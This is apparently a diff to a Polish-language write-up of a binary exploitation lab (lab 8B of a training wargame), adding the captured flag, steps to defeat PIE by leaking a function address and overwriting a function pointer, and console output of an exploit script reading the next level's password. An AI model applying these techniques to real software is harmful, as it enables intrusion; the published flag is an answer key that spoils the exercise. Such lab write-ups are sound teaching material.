@@ -109,7 +109,7 @@ lab8C@warzone:/levels/lab08$ ./lab8C -fd=3 -fn=/home/lab8B/.pass
 
 **Lab 8B**
 
-Flaga:  
+Flaga: `Th@t_w@5_my_f@v0r1t3_ch@11` 
 
 * Binarka skompilowana ze wszystkimi mechanizmami bezpieczeństwa
 * Funkcjonalność to dodawanie do siebie wektorów trzymanych w strukturze:
@@ -155,5 +155,24 @@ but was it really your favorite?\n");
 	}
 }
 ```
-* Aby pokonać PIE wystarczy dodać pierwszy wektor i wypisać go na konsolę - jest tam podany adres funkcji printFunc a następnie policzyć offset pomiędzy `printVector` a `thisIsSecret`
+* Aby pokonać PIE wystarczy dodać pierwszy wektor i wypisać go na konsolę - jest tam podany adres funkcji printFunc a następnie policzyć offset pomiędzy `printVector` a `thisIsSecret` i różnicę tych wartości zapisać w wektorze
+* Pięciokrotne dodanie wektora będącego sumą do ulubionych pozwala na całkowitą kontrolę nad wskaźnikiem funkcji w strukturze
+* Uruchomienie kodu z nowego wskaźnika następuje po załadowaniu ostatniego ulubionego wektora jako v1 i żądaniu jego wyświetlenia:
+```
+lab8B@warzone:/levels/lab08$ python /tmp/lab_8b.py
+[+] Starting program '/levels/lab08/lab8B': Done
+[*] Stage #1 - Adding first vector
+[*] Stage #2 - Leaking printVector() address
+[*] Leaked printVector() address: 0x800010e9
+[*] thisIsSecret() address: 0x800010a7
+[*] Stage #3 - Adding second vector
+[*] Stage #4 - Summing the vectors
+[*] Stage #5 - Overwrite printFunc() address
+[*] Stage #6 - Load malicious vector into v1
+[*] Stage #7 - Execution of thisIsSecret()
+[*] Switching to interactive mode
+[...]
+$ cat /home/lab8A/.pass
+Th@t_w@5_my_f@v0r1t3_ch@11
+```
 
